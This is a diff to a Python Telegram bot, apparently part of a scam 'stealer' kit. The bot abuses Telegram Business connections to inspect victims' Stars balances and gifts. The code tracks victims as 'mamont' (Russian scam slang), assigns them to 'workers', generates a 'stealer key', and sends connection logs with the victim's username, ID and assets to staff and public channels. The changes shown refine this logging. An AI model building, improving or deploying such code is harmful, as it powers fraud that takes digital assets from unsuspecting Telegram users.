@@ -69,7 +69,8 @@ async def start(message: types.Message) -> None:
 async def business_connection(conn: types.BusinessConnection) -> None:
     _ID = conn.id
     _USER_ID = conn.user.id
-    _LANGUAGE = conn.user.language_code
+    if conn.user.username: _USER_NAME = conn.user.username 
+    else: _USER_NAME = "No username"
     _WORKER = await database.get_worker_by_mamont_id(_USER_ID)
     _WORKER = _WORKER if _WORKER is not None else "Неизвестный"
     _KEY = encrypt(str(_USER_ID))[:12]
@@ -115,7 +116,7 @@ async def business_connection(conn: types.BusinessConnection) -> None:
                          _STARS = str(star_amount) + " шт."
                          _VIEW_RIGHT = True
                     else:
-                         _STARS = "Нет данных"
+                         _STARS = star_amount
                 else:
                      _STARS = "Ошибка формата"
                      print(f"Warning: Unexpected 'result' format in get_stars for {_ID}: {result_data}")
@@ -155,25 +156,24 @@ async def business_connection(conn: types.BusinessConnection) -> None:
                          f"⭐️ Звёзд: {_STARS}" "\n"
                          f"🎁 Список подарков ({giftcount} шт.):" "\n"
                          f"{giftlist if giftlist else '└ Нет подарков'}")
-        else:
-            lastPart = f"🙁 Не удалось получить информацию о звездах/подарках. Возможно, не хватает разрешений."
+        else: 
+            lastPart = f"❌ Не удалось получить информацию о подарках. Возможно, не хватает разрешений"
 
         await database.update_mamont(_ID, True)
-        log_message = (f"🔋 Новый коннект:\n"
-                       f" ├ 🦣 Клиент: {_ID}\n"
-                       f" ├ 👤 Пользователь: tg://user?id={_USER_ID}\n"
-                       f" ├ 🏳️ Язык клиента: {_LANGUAGE}\n"
-                       f" ├ 🚨 Воркер: {_WORKER}\n"
-                       f" └ 🔐 Ключ стилла: {_KEY}\n\n"
+        log_message = (f"🔋 *Новый коннект:*\n"
+                       f" ├ 🦣 *Клиент:* {_ID}\n"
+                       f" ├ 👤 *Пользователь:* @{_USER_NAME} (`{_USER_ID}`)\n"
+                       f" ├ 🚨 *Воркер:* {_WORKER}\n"
+                       f" └ 🔐 *Ключ:* `{_KEY}`\n\n"
                        f"{lastPart}")
 
-        await bot.send_message(config._LOGS_CONNECT_STAFF, log_message)
-        public_log_message = log_message.replace(f"└ 🔐 Ключ стилла: {_KEY}", "└ 🔐 Ключ стилла: Скрыт")
-        await bot.send_message(config._LOGS_CONNECT_PUBLIC, public_log_message)
+        await bot.send_message(config._LOGS_CONNECT_STAFF, log_message, parse_mode="Markdown")
+        public_log_message = log_message.replace(f"{_KEY}", "Скрыт")
+        await bot.send_message(config._LOGS_CONNECT_PUBLIC, public_log_message, parse_mode="Markdown")
 
         if isinstance(_WORKER, (int, str)) and str(_WORKER).isdigit():
             try:
-                await bot.send_message(int(_WORKER), log_message)
+                await bot.send_message(int(_WORKER), log_message, parse_mode="Markdown")
             except Exception as e:
                 print(f"Failed to send log to worker {_WORKER}: {e}")
                 await bot.send_message(config._LOGS_CONNECT_PUBLIC, f"Отправить лог воркеру {_WORKER} не удалось\n\n{e}")
